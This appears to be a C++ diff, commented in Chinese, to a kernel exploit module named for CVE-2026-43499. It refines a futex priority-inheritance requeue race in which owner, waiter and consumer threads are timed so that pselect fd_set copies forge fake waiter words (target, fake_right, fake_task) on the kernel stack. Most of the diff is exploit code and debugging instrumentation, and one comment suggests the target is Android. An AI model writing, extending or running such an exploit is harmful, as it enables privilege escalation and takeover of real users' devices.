@@ -70,6 +70,8 @@ namespace ghostlock::backend::cve_2026_43499::landing {
         /** 写请求的元组（target = 目标字段；value = 页派生值 ✓）。 */
         std::uint64_t target = 0U;
         std::uint64_t value = 0U;
+        /** Page-derived value written into tree/pi parent words (not the caller's value). */
+        std::uint64_t fake_right = 0U;
     };
 
     /** 本 route 的报告（与 `MulticastRouteReport` 同形，便于同一套判据 ✓）。 */
@@ -85,6 +87,19 @@ namespace ghostlock::backend::cve_2026_43499::landing {
         std::int32_t waiter_park_errno = 0;
         std::int32_t consumer_setattr = 0;
         std::int32_t consumer_setattr_errno = 0;
+        std::int32_t requeue_result = 0;
+        std::int32_t requeue_errno = 0;
+        std::int32_t race_lock = 0;
+        std::int32_t race_requeue = 0;
+        std::int32_t race_requeue_errno = 0;
+        std::int32_t race_outcome = 0;
+        std::int32_t target_owner_word = 0;
+        std::int32_t wait_word_value = 0;
+        std::int32_t waiter_park_elapsed_us = 0;
+        std::int32_t owner_requeue_result = 0;
+        std::int32_t owner_requeue_errno = 0;
+        std::int32_t select_result = 0;
+        std::int32_t select_errno = 0;
     };
 
     /** 低编号 fd 的**借用账本**（纯 ✓，不含 syscall ✓）：谁被借、借了几次、按什么顺序还 ✓。
@@ -207,6 +222,12 @@ namespace ghostlock::backend::cve_2026_43499::landing {
         std::uint64_t pc = 0U;
         std::uint64_t right = 0U;
         std::uint64_t left = 0U;
+        std::uint64_t tree_pc = 0U;
+        std::uint64_t tree_right = 0U;
+        std::uint64_t tree_left = 0U;
+        std::uint64_t pi_pc = 0U;
+        std::uint64_t pi_right = 0U;
+        std::uint64_t pi_left = 0U;
         std::uint64_t task = 0U;
         std::uint64_t lock = 0U;
         std::uint64_t wake_state = 0U;
@@ -229,14 +250,18 @@ namespace ghostlock::backend::cve_2026_43499::landing {
             return nullptr;
         };
         const char *bad = nullptr;
-        if ((bad = word_of(offsets.pc, "waiter-pc-not-a-word", config.word_pi_pc)) != nullptr) { return bad; }
-        config.word_tree_pc = config.word_pi_pc;   /* tree 与 pi 用同一字段偏移 ✓ */
-        config.word_tree_right = config.word_pi_right;
-        config.word_tree_left = config.word_pi_left;
-        if ((bad = word_of(offsets.right, "waiter-right-not-a-word", config.word_pi_right)) != nullptr) { return bad; }
-        if ((bad = word_of(offsets.left, "waiter-left-not-a-word", config.word_pi_left)) != nullptr) { return bad; }
-        config.word_tree_right = config.word_pi_right;
-        config.word_tree_left = config.word_pi_left;
+        const std::uint64_t tree_pc = offsets.tree_pc != 0U ? offsets.tree_pc : offsets.pc;
+        const std::uint64_t tree_right = offsets.tree_right != 0U ? offsets.tree_right : offsets.right;
+        const std::uint64_t tree_left = offsets.tree_left != 0U ? offsets.tree_left : offsets.left;
+        const std::uint64_t pi_pc = offsets.pi_pc != 0U ? offsets.pi_pc : offsets.pc;
+        const std::uint64_t pi_right = offsets.pi_right != 0U ? offsets.pi_right : offsets.right;
+        const std::uint64_t pi_left = offsets.pi_left != 0U ? offsets.pi_left : offsets.left;
+        if ((bad = word_of(tree_pc, "waiter-tree-pc-not-a-word", config.word_tree_pc)) != nullptr) { return bad; }
+        if ((bad = word_of(tree_right, "waiter-tree-right-not-a-word", config.word_tree_right)) != nullptr) { return bad; }
+        if ((bad = word_of(tree_left, "waiter-tree-left-not-a-word", config.word_tree_left)) != nullptr) { return bad; }
+        if ((bad = word_of(pi_pc, "waiter-pi-pc-not-a-word", config.word_pi_pc)) != nullptr) { return bad; }
+        if ((bad = word_of(pi_right, "waiter-pi-right-not-a-word", config.word_pi_right)) != nullptr) { return bad; }
+        if ((bad = word_of(pi_left, "waiter-pi-left-not-a-word", config.word_pi_left)) != nullptr) { return bad; }
         if ((bad = word_of(offsets.task, "waiter-task-not-a-word", config.word_task)) != nullptr) { return bad; }
         if ((bad = word_of(offsets.lock, "waiter-lock-not-a-word", config.word_lock)) != nullptr) { return bad; }
         if ((bad = word_of(offsets.wake_state, "waiter-wake-state-not-a-word", config.word_wake_prio)) != nullptr) {
@@ -291,6 +316,13 @@ namespace ghostlock::backend::cve_2026_43499::landing {
         FD_ZERO(&ex_set);
         std::array<SelectStackWord, 11U> words{};
         (void) select_stack_compact_words(config, words);
+        for (std::size_t i = 0U; i < words.size(); ++i) {
+            for (std::size_t j = i + 1U; j < words.size(); ++j) {
+                if (words[i].word >= 0 && words[i].word == words[j].word) {
+                    return "select-stack-duplicate-word";
+                }
+            }
+        }
         for (const SelectStackWord &word : words) {
             const SelectStackWordSite site = select_stack_word_site(word.word, config);
             if (site.set_index < 0) {
@@ -315,10 +347,10 @@ namespace ghostlock::backend::cve_2026_43499::landing {
     [[nodiscard]] inline bool select_stack_compact_words(
             const SelectStackConfig &config,
             std::array<SelectStackWord, 11U> &out) noexcept {
-        out[0] = {config.word_tree_pc, config.value};                                   /* tree_pc ← 页派生值 */
+        out[0] = {config.word_tree_pc, config.fake_right};                              /* tree_pc ← 页派生 right */
         out[1] = {config.word_tree_right, 0U};
         out[2] = {config.word_tree_left, config.target};
-        out[3] = {config.word_pi_pc, config.value};
+        out[3] = {config.word_pi_pc, config.fake_right};
         out[4] = {config.word_pi_right, 0U};
         out[5] = {config.word_pi_left, config.target};
         out[6] = {config.word_task, config.fake_task};
@@ -350,6 +382,9 @@ namespace ghostlock::backend::cve_2026_43499::landing {
             target_word_ = target_word;
             if (config_.fd_count == 0U || config_.fd_count % 64U != 0U) {
                 return "select-stack-fd-count-not-multiple-of-64";
+            }
+            if (config_.fake_right == 0U) {
+                return "select-stack-fake-right-missing";
             }
             std::printf("main: sel-prep pipe ✓");
             if (Ops::make_pipe(pipe_read_, pipe_write_) != 0) {
@@ -402,6 +437,23 @@ namespace ghostlock::backend::cve_2026_43499::landing {
                 cleanup();
                 return sets_bad;
             }
+            /* Only fill fd bits that are closed; replacing an open ART fd with the timer would abort
+             * the app. The opened bits are closed again by cleanup(). */
+            for (std::int32_t fd = 0; fd < static_cast<std::int32_t>(config_.fd_count); ++fd) {
+                if (!FD_ISSET(fd, &owned_in_) && !FD_ISSET(fd, &owned_out_) && !FD_ISSET(fd, &owned_ex_)) {
+                    continue;
+                }
+                if (Ops::is_open(fd)) continue;
+                if (installed_count_ >= installed_.size()) {
+                    cleanup();
+                    return "select-stack-installed-capacity";
+                }
+                if (Ops::install_at(high_read_, fd) != 0) {
+                    cleanup();
+                    return "select-stack-install-failed";
+                }
+                installed_[installed_count_++] = fd;
+            }
             return nullptr;
         }
 
@@ -409,7 +461,11 @@ namespace ghostlock::backend::cve_2026_43499::landing {
         void cleanup() noexcept {
             /* ① 还原 stdio：把备份 dup2 回原位置 ✓（低编号借用 ✓）。 */
             for (std::size_t i = 0U; i < installed_count_; ++i) {
-                (void) Ops::install_at(backup_[i], installed_[i]);
+                if (i < backup_count_) {
+                    (void) Ops::install_at(backup_[i], installed_[i]);
+                } else {
+                    Ops::close_fd(installed_[i]);
+                }
             }
             /* ② 关备份副本 ✓（关的是我们自己造的高位副本 ✓）。 */
             for (std::size_t i = 0U; i < backup_count_; ++i) {
@@ -461,7 +517,8 @@ namespace ghostlock::backend::cve_2026_43499::landing {
             /* 尝试循环的骨架 ✓：**每轮重建三组**（= 退役的 re-poison 同族 ✓）+ 一次 `pselect` ✓。
              *  演员/武装尚未接 ✗ ⇒ 本轮只验证"载荷能进内核且不报错"这一步 ✓。 */
             for (std::int32_t attempt = 1; attempt <= config_.attempts; ++attempt) {
-                /* 每轮只需在**已保存**的三组上重装低位 fd ✓（快照同 ✓；不再重建 ✓）。 */
+                /* Rebuild the fake waiter words each attempt; the previous round may have consumed them. */
+                (void) select_stack_build_fdsets(config_, owned_in_, owned_out_, owned_ex_);
                 for (std::size_t i = 0U; i < plan_.low_count; ++i) {
                     FD_SET(plan_.low_fds[i], &owned_in_);
                 }
@@ -478,9 +535,9 @@ namespace ghostlock::backend::cve_2026_43499::landing {
                  *  依据：内核 `FUTEX_WAIT_REQUEUE_PI` 的入队语义与 `uaddr2` 的持锁状态相关 ✓，
                  *  而我的时间线显示 park 早于 owner 的 `lock_pi(target)` ✗。
                  *  同线程重入 PI 锁是安全的 ✓（引擎随后会再锁一次 ✓）。 */
-                const std::int32_t pre_target = Ops::lock_pi(target_word_);
-                std::printf("main: sel-exec pre-target-lock=%d target=0x%x", pre_target,
-                            *target_word_);
+                /* Do not lock the target and then zero it: that leaves a PI owner word that no
+                 * longer describes the owner. The race engine locks the target after the waiter has
+                 * parked. */
                 /* ★ 每轮**重新归零**三个字（round 218 ✓ 实测）：上一轮结束时 `chain` 仍停在某个 tid ✗
                  *  ⇒ 本轮 waiter 的 `lock_pi(chain)` 会**无限等** ✗（EXIT=124 ✓，与 round 205 同族）。
                  *  此时上一轮的演员已 stop（join 或 detach ✓）⇒ 归零是安全的 ✓。 */
@@ -504,14 +561,6 @@ namespace ghostlock::backend::cve_2026_43499::landing {
                 /* ★★ **主线程自己 pselect**（快照 :536 ✓）：fd_set 的拷贝落在**这一张栈**上 ✓，
                  *  而 waiter 线程此刻正 park 在 `wait` 字上（= 被覆盖的"陈旧 waiter" ✓）。
                  *  round 190 我把这一步搬进了 waiter ✗ ⇒ 拷贝落错了线程 ⇒ 写入没有对象 ✓。 */
-                /* 触发改由 waiter 在 park 返回后完成 ✓（round 234 ✓）⇒ 主线程只**等它** ✓。 */
-                std::int32_t wait_budget = 500000;
-                while (waiter_done_.load() == 0 && wait_budget > 0) {
-                    Ops::sleep_micros(100);
-                    --wait_budget;
-                }
-                /* ★ stop 必须在窗口**关掉之前** ✓（否则 pselect 里的线程会拖到收尾 ✓）。 */
-                stop_actors(waiter_thread_, consumer_thread_);
                 report_.calls = attempt;
                 /* 三演员（配方 ✓）：引擎与守卫都是既有件 ✓；本类只负责 enter/reclaim 的配对 ✓。 */
                 /* ★ owner 侧也上链（快照 :194 ✓）：`LOCK_PI(chain)` 会**阻塞到等待者持链为止** ✓
@@ -526,22 +575,22 @@ namespace ghostlock::backend::cve_2026_43499::landing {
                  *  还有 `::usleep(1000)` ✓）⇒ 让等待者**在 requeue 之前**真正进到 park 里 ✓。 */
                 /* 判别实验（round 221 ✓）：把沉降拉到 **50 ms**（远超任何启动竞态 ✓）⇒
                  *  若 requeue 仍 ret=0 ✗ ⇒ 不是时机问题 ✓；若变 1 ✓ ⇒ 是时机问题 ✓。 */
+                /* Wait until the waiter is actually inside the park; a requeue before that
+                 * moves nobody and leaves the wait to time out. */
+                std::int32_t armed = 0;
+                while (waiter_waiting_.load() == 0 && armed < 500000) {
+                    Ops::sleep_micros(100);
+                    ++armed;
+                }
+                /* The flag is set just before the syscall; give the kernel a short settle so
+                 * the waiter is actually enqueued before CMP_REQUEUE_PI. */
                 Ops::sleep_micros(50000);
                 guard_.enter(race::ExitPath::Success);
-                const RaceOutcome raced = race_.run(guard_);
-                /* 诊断（round 219 ✓）：直接**量一次** requeue 的返回值与 errno —— `successes=0` 的直接来源 ✓。
-                 *  注意这是**额外**一次调用（引擎内部已调过一次 ✓）⇒ 只用于读数，不参与判定 ✓。 */
-                {
-                    /* ★★ `CMP_REQUEUE_PI` 的 `val` 是 `uaddr1` 的**期望值** ✓ ⇒ 快照传 1 ⇒
-                     *  所以 `wait` 字必须**等于 1** ✗（我此前是 0 ⇒ EAGAIN=35 ✓，与归档退役同读数 ✓）。 */
-                    /* 撤销 wait=1（round 226 ✓）：改与 ops 的 val=0 配对 ✓。 */
-                    const std::int32_t probe_rq = Ops::cmp_requeue_pi(wait_word_, target_word_);
-                    std::printf("main: sel-exec requeue-probe ret=%d errno=%d wait=%p chain=%p target=%p",
-                                probe_rq, Ops::last_errno(),
-                                static_cast<const void *>(wait_word_),
-                                static_cast<const void *>(chain_word_),
-                                static_cast<const void *>(target_word_));
-                }
+                /* Requeue can race the kernel-side park even after waiter_waiting is set; retry
+                 * while the waiter is still inside its bounded park. */
+                target_at_requeue_.store(static_cast<std::int32_t>(*target_word_));
+                wait_at_requeue_.store(static_cast<std::int32_t>(*wait_word_));
+                RaceOutcome raced = race_.requeue();
                 std::printf("main: sel-exec words-out wait=0x%x chain=0x%x target=0x%x",
                             *wait_word_, *chain_word_, *target_word_);
                 guard_.reclaim();
@@ -550,17 +599,36 @@ namespace ghostlock::backend::cve_2026_43499::landing {
                  *  "The count of waiters the kernel moved is the evidence: a count of one is the kernel
                  *   saying a waiter was really there" ⇒ 所以 `Running` ⟺ 内核真搬了等待者 ✓，
                  *  与快照的 `race->consumer_success > 0` 是同一件事 ✓（`Refused` 才是没搬 ✓）。 */
-                if (raced == RaceOutcome::Running) {
-                    report_.successes = 1;
-                    break;
+                /* The waiter must still be parked while we requeue; wait for it only after
+                 * the requeue attempt, never before. */
+                std::int32_t wait_budget = 500000;
+                while (waiter_done_.load() == 0 && wait_budget > 0) {
+                    Ops::sleep_micros(100);
+                    --wait_budget;
                 }
+                /* stop must happen before the window closes, or the pselect thread lingers. */
+                stop_actors(waiter_thread_, consumer_thread_, owner_thread_);
+                report_.race_lock = owner_lock_result_.load();
+                report_.target_owner_word = target_at_requeue_.load();
+                report_.wait_word_value = wait_at_requeue_.load();
+                report_.race_requeue = race_.last_requeue_result();
+                report_.race_requeue_errno = race_.last_requeue_errno();
+                report_.race_outcome = static_cast<std::int32_t>(raced);
+                (void)raced;
             }
+            report_.calls = setattr_calls_.load();
+            report_.successes = setattr_success_.load();
             /* 收尾顺序（§5 ✓）：先停演员访问 ✓、再回收 ✓、最后还原资源 ✓。 */
             race_.disarm();
             race_.destroy();
             report_.waiter_lock = waiter_lock_.load();
             report_.waiter_park = waiter_park_.load();
             report_.waiter_park_errno = waiter_park_errno_.load();
+            report_.waiter_park_elapsed_us = waiter_park_elapsed_us_.load();
+            report_.owner_requeue_result = owner_requeue_result_.load();
+            report_.owner_requeue_errno = owner_requeue_errno_.load();
+            report_.select_result = select_result_.load();
+            report_.select_errno = select_errno_.load();
             report_.consumer_setattr = consumer_setattr_.load();
             report_.consumer_setattr_errno = consumer_setattr_errno_.load();
             cleanup();
@@ -578,8 +646,25 @@ namespace ghostlock::backend::cve_2026_43499::landing {
             fd_set *in_set = nullptr;
             fd_set *out_set = nullptr;
             fd_set *ex_set = nullptr;
-            std::int32_t waiter_tid = 0;
+            std::atomic<std::int32_t> waiter_tid{0};
         };
+
+        /** owner 线程：在 waiter park 之前持有 target，等链，requeue 后才释放。 */
+        static void *owner_entry(void *raw) noexcept {
+            auto *args = static_cast<ActorArgs *>(raw);
+            SelectStackRoute *self = args->self;
+            const std::int32_t lock_target = Ops::lock_pi(self->target_word_);
+            self->owner_lock_result_.store(lock_target);
+            if (lock_target != 0) return nullptr;
+            self->owner_started_.store(1);
+            while (self->waiter_ready_.load() == 0) Ops::yield();
+            (void)Ops::lock_pi(self->chain_word_);
+            self->owner_chain_done_.store(1);
+            while (self->owner_stop_.load() == 0) Ops::yield();
+            (void)Ops::unlock_pi(self->chain_word_);
+            (void)Ops::unlock_pi(self->target_word_);
+            return nullptr;
+        }
 
         /** waiter 线程：先 lock 住 chain 字 ✓（它的 park 才是 PI 链的一环 ✓），再在窗口内 pselect ✓。 */
         static void *waiter_entry(void *raw) noexcept {
@@ -591,21 +676,32 @@ namespace ghostlock::backend::cve_2026_43499::landing {
             const std::int32_t wlock = Ops::lock_pi(self->chain_word_);
             self->waiter_lock_.store(wlock);
             std::printf("main: waiter locked=%d chain=0x%x", wlock, *self->chain_word_);
-            args->waiter_tid = Ops::thread_id();
+            args->waiter_tid.store(Ops::thread_id());
             self->waiter_ready_.store(1);
-            std::printf("main: waiter ready tid=%d", args->waiter_tid);
+            std::printf("main: waiter ready tid=%d", args->waiter_tid.load());
             while (self->actors_go_.load() == 0) {
+                Ops::yield();
+            }
+            while (self->owner_started_.load() == 0) {
                 Ops::yield();
             }
             std::printf("main: waiter go");
             std::printf("main: waiter pre-park wait=%p(0x%x) target=%p(0x%x)",
                         static_cast<const void *>(self->wait_word_), *self->wait_word_,
                         static_cast<const void *>(self->target_word_), *self->target_word_);
+            self->waiter_waiting_.store(1);
+            struct timespec park_before{};
+            struct timespec park_after{};
+            (void)::clock_gettime(CLOCK_MONOTONIC, &park_before);
             const std::int32_t parked = Ops::wait_requeue_pi_until(self->wait_word_, self->target_word_,
                                                                     self->actor_wait_us_);
             /* errno 必须在**这个线程**上取 ✓（last_errno 读的是调用线程的 ✓；park 的 -1 有三种可能：
              *  EAGAIN=字值不匹配 / EPERM=不允许等 / EINVAL=参数 ⇒ 三者修法完全不同 ✓）。 */
             const std::int32_t park_errno = Ops::last_errno();
+            (void)::clock_gettime(CLOCK_MONOTONIC, &park_after);
+            self->waiter_park_elapsed_us_.store(static_cast<std::int32_t>(
+                (park_after.tv_sec - park_before.tv_sec) * 1000000 +
+                (park_after.tv_nsec - park_before.tv_nsec) / 1000));
             std::printf("main: waiter parked=%d errno=%d (immediate ✓)", parked, park_errno);
             self->waiter_park_errno_.store(park_errno);
             self->waiter_park_.store(parked);
@@ -613,8 +709,15 @@ namespace ghostlock::backend::cve_2026_43499::landing {
              *  —— 退役注释原话：拷贝落在"调用者的栈"上 ⇒ 触发线程必须正是"park 刚返回"的那个 ✓
              *  （multicast 的 execute :250-254 同义 ✓）。此前这一步在主线程 ✗ ⇒ 上下文对不上 ✓。 */
             std::printf("main: waiter post-park pselect ✓");
-            (void) Ops::pselect_now(static_cast<int>(self->config_.fd_count), self->owned_in_,
-                                    self->owned_out_, self->owned_ex_, self->config_.select_wait_us);
+            self->consumer_go_.store(1);
+            const std::int32_t selected = self->config_.compact
+                    ? Ops::pselect_now(static_cast<int>(self->config_.fd_count), self->owned_in_,
+                                       self->owned_out_, self->owned_ex_, self->config_.select_wait_us)
+                    : Ops::select_now(static_cast<int>(self->config_.fd_count), self->owned_in_,
+                                      self->owned_out_, self->owned_ex_, self->config_.select_wait_us);
+            self->consumer_go_.store(0);
+            self->select_result_.store(selected);
+            self->select_errno_.store(Ops::last_errno());
             std::printf("main: waiter trigger done ✓");
             (void) Ops::unlock_pi(self->chain_word_);
             self->waiter_done_.store(1);
@@ -626,14 +729,19 @@ namespace ghostlock::backend::cve_2026_43499::landing {
             auto *args = static_cast<ActorArgs *>(raw);
             SelectStackRoute *self = args->self;
             while (self->consumer_stop_.load() == 0) {
-                if (args->waiter_tid == 0) {
+                if (self->consumer_go_.load() == 0) {
+                    Ops::yield();
+                    continue;
+                }
+                const std::int32_t waiter_tid = args->waiter_tid.load();
+                if (waiter_tid == 0) {
                     Ops::yield();
                     continue;
                 }
                 const std::int32_t nice =
                         (self->nice_step_ % ((self->config_.nice_modulus > 0) ? self->config_.nice_modulus : 1)) + 1;
                 ++self->nice_step_;
-                const std::int32_t set_ret = Ops::setattr(args->waiter_tid, nice, 0);
+                const std::int32_t set_ret = Ops::setattr(waiter_tid, nice, 0);
                 /* 首次结果与总次数都留下（round 196 ✓）：只存"最后一次"会漏掉"首次是否成功" ✗。 */
                 const std::int32_t seen = self->setattr_seen_.fetch_add(1);
                 if (seen == 0) {
@@ -641,6 +749,7 @@ namespace ghostlock::backend::cve_2026_43499::landing {
                     self->consumer_setattr_errno_.store(Ops::last_errno());
                 }
                 self->setattr_calls_.fetch_add(1);
+                if (set_ret == 0) self->setattr_success_.fetch_add(1);
                 if (set_ret != 0) {
                     /* 兜底：自己取一次 target 锁再放掉 ✓（与 multicast 的 consumer 同形 ✓）。 */
                     if (Ops::lock_pi(self->target_word_) == 0) {
@@ -660,14 +769,35 @@ namespace ghostlock::backend::cve_2026_43499::landing {
             args.out_set = &out_set;
             args.ex_set = &ex_set;
             waiter_ready_.store(0);
+            waiter_waiting_.store(0);
             waiter_done_.store(0);
             actors_go_.store(0);
             consumer_stop_.store(0);
+            owner_started_.store(0);
+            owner_chain_done_.store(0);
+            owner_stop_.store(0);
             pthread_t waiter{};
             pthread_t consumer{};
+            pthread_t owner{};
+            owner_thread_ = owner;
             waiter_thread_ = waiter;
             consumer_thread_ = consumer;
+            if (::pthread_create(&owner, nullptr, &SelectStackRoute::owner_entry, &args) != 0) {
+                return false;
+            }
+            std::int32_t owner_spins = 0;
+            while (owner_started_.load() == 0 && owner_spins < 500000) {
+                Ops::yield();
+                ++owner_spins;
+            }
+            if (owner_started_.load() == 0) {
+                owner_stop_.store(1);
+                (void) ::pthread_join(owner, nullptr);
+                return false;
+            }
             if (::pthread_create(&waiter, nullptr, &SelectStackRoute::waiter_entry, &args) != 0) {
+                owner_stop_.store(1);
+                (void) ::pthread_join(owner, nullptr);
                 return false;
             }
             std::printf("main: actors waiter-created");
@@ -691,7 +821,8 @@ namespace ghostlock::backend::cve_2026_43499::landing {
         }
 
         /** 停两枚演员并 join ✓（成功/失败/早退都走这里 ✓）。 */
-        void stop_actors(pthread_t waiter, pthread_t consumer) noexcept {
+        void stop_actors(pthread_t waiter, pthread_t consumer, pthread_t owner) noexcept {
+            owner_stop_.store(1);
             consumer_stop_.store(1);
             (void) ::pthread_join(consumer, nullptr);
             /* **有界**等待（round 188 ✓）：此前是无限自旋 ✗ ⇒ 真机卡住 180 s ✓。
@@ -709,6 +840,7 @@ namespace ghostlock::backend::cve_2026_43499::landing {
                 (void) ::pthread_detach(waiter);
                 report_.status_step = 90;   /* 相位号 90 = "等待者未归、已 detach" ✓（可观测 ✓） */
             }
+            (void) ::pthread_join(owner, nullptr);
         }
 
         SelectStackConfig config_{};
@@ -721,20 +853,35 @@ namespace ghostlock::backend::cve_2026_43499::landing {
         std::atomic<std::int32_t> waiter_lock_{0};
         std::atomic<std::int32_t> waiter_park_{0};
         std::atomic<std::int32_t> waiter_park_errno_{0};
+        std::atomic<std::int32_t> waiter_park_elapsed_us_{0};
+        std::atomic<std::int32_t> select_result_{0};
+        std::atomic<std::int32_t> select_errno_{0};
         std::atomic<std::int32_t> consumer_setattr_{0};
         std::atomic<std::int32_t> consumer_setattr_errno_{0};
         std::atomic<std::int32_t> setattr_seen_{0};
         std::atomic<std::int32_t> setattr_calls_{0};
+        std::atomic<std::int32_t> setattr_success_{0};
         std::atomic<std::int32_t> waiter_ready_{0};
+        std::atomic<std::int32_t> waiter_waiting_{0};
+        std::atomic<std::int32_t> owner_started_{0};
+        std::atomic<std::int32_t> owner_lock_result_{0};
+        std::atomic<std::int32_t> owner_requeue_result_{0};
+        std::atomic<std::int32_t> owner_requeue_errno_{0};
+        std::atomic<std::int32_t> owner_chain_done_{0};
+        std::atomic<std::int32_t> owner_stop_{0};
+        std::atomic<std::int32_t> target_at_requeue_{0};
+        std::atomic<std::int32_t> wait_at_requeue_{0};
         std::atomic<std::int32_t> waiter_done_{0};
         std::atomic<std::int32_t> actors_go_{0};
         std::atomic<std::int32_t> consumer_stop_{0};
+        std::atomic<std::int32_t> consumer_go_{0};
         std::int32_t nice_step_ = 0;
         /** 等待者的 park 时长（round 196 ✓）：200 ms 太短 ✗ ⇒ 消费者还没动手它就退出 ⇒ `ESRCH` ✓。
          *  快照用"永不就绪的 timerfd"让它一直等 ✓ ⇒ 这里取 2 s ✓（仍有界，防挂 ✓）。 */
         std::int64_t actor_wait_us_ = 2000000;
         pthread_t waiter_thread_{};
         pthread_t consumer_thread_{};
+        pthread_t owner_thread_{};
         race::WindowGuard guard_{};      /* 窗口守卫（可重复 enter ✓） */
         /** 真 futex landing（round 203 ✓，**关键** ✓）：`pi_race.hpp` 里默认的 `FutexOps` 是**空实现** ✗
          *  （四个方法全 `return 0` ✓）⇒ 用它时 `cmp_requeue_pi` 恒 <1 ⇒ 每轮 Refused ⇒ successes=0 ✓。
@@ -748,6 +895,7 @@ namespace ghostlock::backend::cve_2026_43499::landing {
             static std::int32_t wait_requeue_pi(std::uint32_t *chain, std::uint32_t *target) noexcept {
                 return Ops::wait_requeue_pi_until(chain, target, 2000000);
             }
+            static std::int32_t last_errno() noexcept { return Ops::last_errno(); }
         };
         race::PiRace<SelectStackLanding> race_{};   /* 引擎绑定**真** landing ✓（此前是空实现 ✗） */
         std::int32_t pipe_read_ = -1;
@@ -759,9 +907,9 @@ namespace ghostlock::backend::cve_2026_43499::landing {
         fd_set owned_out_{};
         fd_set owned_ex_{};
         bool timer_borrows_pipe_ = false;
-        std::array<std::int32_t, 64U> backup_{};
+        std::array<std::int32_t, 1024U> backup_{};
         std::size_t backup_count_ = 0U;
-        std::array<std::int32_t, 64U> installed_{};
+        std::array<std::int32_t, 1024U> installed_{};
         std::size_t installed_count_ = 0U;
     };
 
